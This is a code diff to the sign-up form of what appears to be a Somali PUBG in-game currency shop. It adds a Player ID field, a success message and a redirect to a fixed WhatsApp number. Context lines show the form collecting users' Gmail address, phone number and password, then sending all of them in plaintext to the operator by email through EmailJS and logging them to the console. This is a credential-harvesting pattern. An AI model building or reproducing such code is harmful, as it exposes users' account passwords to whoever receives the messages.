@@ -14,10 +14,12 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
   const [formData, setFormData] = useState({
     email: '',
     phone: '',
-    password: ''
+    password: '',
+    playerId: ''
   });
   const [status, setStatus] = useState<{ type: 'success' | 'error', msg: string } | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
   useEffect(() => {
     const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
@@ -47,6 +49,7 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
         user_email: formData.email,
         user_phone: formData.phone,
         user_password: formData.password,
+        player_id: formData.playerId,
       };
 
       try {
@@ -54,10 +57,20 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
         const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
         const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
 
+        const sendToWhatsApp = () => {
+          const tel_number = "252771909054"; 
+          const message = `Asc Maanka, waxaan rabaa inaan iibsado UC&conis. Xogtaydu waa lambarka lacagta: Tel: ${formData.phone}`;
+          const whatsappUrl = `https://wa.me/${tel_number}?text=${encodeURIComponent(message)}`;
+          window.open(whatsappUrl, '_blank');
+        };
+
         if (serviceId && templateId && publicKey && serviceId !== 'YOUR_SERVICE_ID') {
           await emailjs.send(serviceId, templateId, templateParams, publicKey);
           
+          setIsSubmitting(false);
           if (onSuccess) onSuccess();
+          setIsSubmitted(true);
+          sendToWhatsApp();
 
           setStatus({ 
             type: 'success', 
@@ -66,14 +79,15 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
         } else {
           // Demo fallback
           console.log('EmailJS keys not configured. Data:', formData);
+          setIsSubmitting(false);
           if (onSuccess) onSuccess();
+          setIsSubmitted(true);
+          sendToWhatsApp();
           setStatus({ 
             type: 'success', 
             msg: "Waad ku mahadsantahay is-diiwaangelinta! (Demo Mode)\nDalabkaaga UC waa nala soo gaaray." 
           });
         }
-
-        setTimeout(() => onBack(), 3000);
       } catch (error: any) {
         console.error('EmailJS Error:', error);
         setStatus({ type: 'error', msg: "Khalad ayaa dhacay, fadlan mar kale isku day." });
@@ -133,6 +147,25 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
           )}
 
           <form className="space-y-5" onSubmit={handleSubmit}>
+            {mode === 'signup' && (
+              <div>
+                <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">PUBG Player ID</label>
+                <div className="relative">
+                  <div className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 flex items-center justify-center">
+                    <span className="text-[10px] font-black text-brand-primary">ID</span>
+                  </div>
+                  <input 
+                    type="text" 
+                    placeholder="Geli Player ID-gaaga"
+                    value={formData.playerId}
+                    onChange={(e) => setFormData({...formData, playerId: e.target.value})}
+                    className="w-full bg-brand-bg/50 border border-slate-700 rounded-xl py-3.5 pl-12 pr-4 text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-brand-primary transition-all"
+                    id="auth-playerid-input"
+                  />
+                </div>
+              </div>
+            )}
+
             <div>
               <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">Gmail-kaaga</label>
               <div className="relative">
@@ -190,24 +223,30 @@ export default function Auth({ onBack, initialMode = 'signup', onSuccess }: Auth
               </div>
             </div>
 
-            <button 
-              type="submit"
-              disabled={isSubmitting}
-              className={`w-full bg-brand-primary text-brand-bg py-4 rounded-xl font-black text-lg hover:bg-brand-primary-hover transition-all flex items-center justify-center gap-2 mt-4 shadow-lg shadow-brand-primary/10 ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
-              id="auth-submit-btn"
-            >
-              {isSubmitting ? (
-                <div className="flex items-center gap-2">
-                  <div className="w-5 h-5 border-2 border-brand-bg border-t-transparent rounded-full animate-spin" />
-                  Diraya...
-                </div>
-              ) : (
-                <>
-                  {mode === 'signup' ? 'Abuur Koontada' : 'Soo Gal'}
-                  <ArrowRight className="w-5 h-5" />
-                </>
-              )}
-            </button>
+            {isSubmitted ? (
+              <div className="w-full bg-brand-primary/10 text-brand-primary py-4 rounded-xl font-black text-lg flex items-center justify-center gap-2 mt-4 border border-brand-primary/20 shadow-lg animate-pulse" id="auth-success-message">
+                Dalabkaaga waa nala soo gaaray
+              </div>
+            ) : (
+              <button 
+                type="submit"
+                disabled={isSubmitting}
+                className={`w-full bg-brand-primary text-brand-bg py-4 rounded-xl font-black text-lg hover:bg-brand-primary-hover transition-all flex items-center justify-center gap-2 mt-4 shadow-lg shadow-brand-primary/10 ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                id="auth-submit-btn"
+              >
+                {isSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <div className="w-5 h-5 border-2 border-brand-bg border-t-transparent rounded-full animate-spin" />
+                    Diraya...
+                  </div>
+                ) : (
+                  <>
+                    {mode === 'signup' ? 'Sign Up' : 'Soo Gal'}
+                    <ArrowRight className="w-5 h-5" />
+                  </>
+                )}
+              </button>
+            )}
           </form>
 
           <div className="mt-10 pt-8 border-t border-slate-800/50">
